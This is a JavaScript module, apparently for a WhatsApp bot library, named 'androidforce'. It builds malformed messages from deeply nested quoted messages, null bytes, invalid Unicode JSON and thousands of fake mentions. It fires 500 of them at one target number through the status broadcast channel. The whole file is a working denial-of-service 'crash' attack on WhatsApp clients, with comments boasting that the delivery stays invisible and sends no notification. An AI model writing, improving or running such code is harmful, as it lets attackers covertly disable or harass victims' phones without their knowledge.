const crypto = require("crypto");

module.exports = async function androidforce(sock, target) {
    const jid = target.includes("@") ? target : `${target}@s.whatsapp.net`;
    const baseId = crypto.randomBytes(16).toString("hex").toUpperCase();

    // ============================================================
    // NESTING BUILDERS
    // ============================================================
    const nestedQuote = (depth) => {
        let inner = { conversation: "\0" };
        for (let i = 0; i < depth; i++) {
            inner = {
                extendedTextMessage: {
                    text: "\0",
                    contextInfo: {
                        quotedMessage: inner
                    }
                }
            };
        }
        return inner;
    };

    const nestedCtx = (depth) => {
        let inner = { remoteJid: "\0", stanzaId: crypto.randomBytes(8).toString("hex") };
        for (let i = 0; i < depth; i++) {
            inner = {
                remoteJid: "\0",
                stanzaId: crypto.randomBytes(8).toString("hex"),
                quotedMessage: {
                    extendedTextMessage: { text: "\0", contextInfo: inner }
                }
            };
        }
        return inner;
    };

    const badJson = (() => {
        let o = { a: "\uD800" };
        for (let i = 0; i < 400; i++) o = { n: o, k: "\0", v: "\uDFFF" };
        return JSON.stringify(o);
    })();

    // ============================================================
    // PAYLOAD TYPES — rotate for high volume
    // ============================================================
    const makeAndroidPayload = () => ({
        extendedTextMessage: {
            text: "\0",
            contextInfo: {
                quotedMessage: nestedQuote(800)
            }
        }
    });

    const makeAndroidDeepPayload = () => ({
        extendedTextMessage: {
            text: "\0",
            contextInfo: {
                quotedMessage: nestedQuote(1500)
            }
        }
    });

    const makeIOSPayload = () => ({
        interactiveMessage: {
            header: {
                title: "\0",
                hasMediaAttachment: false
            },
            body: { text: "\0" },
            nativeFlowMessage: {
                buttons: [],
                messageParamsJson: badJson
            },
            contextInfo: {
                addonActionSection: {
                    actionType: null,
                    primitives: []
                },
                quotedMessage: nestedCtx(500)
            }
        }
    });

    const makeIOSViewOnce = () => ({
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: { title: "\0", hasMediaAttachment: false },
                    nativeFlowMessage: { buttons: [] },
                    contextInfo: {
                        addonActionSection: { actionType: null, primitives: [] },
                        quotedMessage: nestedCtx(500)
                    }
                }
            }
        }
    });

    const makeCombinedPayload = () => ({
        extendedTextMessage: {
            text: "\0",
            contextInfo: {
                quotedMessage: nestedQuote(1200),
                conversionSource: "\0",
                conversionData: Buffer.alloc(2000, 0).toString("base64")
            }
        }
    });

    const makeMassMention = () => ({
        extendedTextMessage: {
            text: "\0",
            contextInfo: {
                quotedMessage: nestedQuote(400),
                mentionedJid: Array.from({ length: 8000 }, () =>
                    `${crypto.randomBytes(4).toString("hex")}@s.whatsapp.net`
                )
            }
        }
    });

    // ============================================================
    // HIGH-VOLUME FIRE — 500 payloads per call
    // ============================================================
    const builders = [
        makeAndroidPayload,
        makeAndroidDeepPayload,
        makeIOSPayload,
        makeIOSViewOnce,
        makeCombinedPayload,
        makeMassMention
    ];

    const TOTAL = 500;

    for (let i = 0; i < TOTAL; i++) {
        const builder = builders[i % builders.length];
        const payload = builder();
        const msgId = `${baseId}${i.toString(16).padStart(4, "0")}`;

        try {
            await sock.relayMessage("status@broadcast", payload, {
                messageId: msgId,
                statusJidList: [jid],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { appdata: "default" },
                        content: [
                            // ONLY status_attribution — no mentioned_users
                            // This keeps it invisible — no chat bubble, no notification
                            {
                                tag: "status_attribution",
                                attrs: { hidden: "true" },
                                content: []
                            }
                        ]
                    }
                ]
            });

            // tiny delay so each gets own DB row, but still very fast
            if (i % 20 === 0) {
                await new Promise(r => setTimeout(r, 50));
            }
        } catch (e) {
            // continue
        }
    }
};
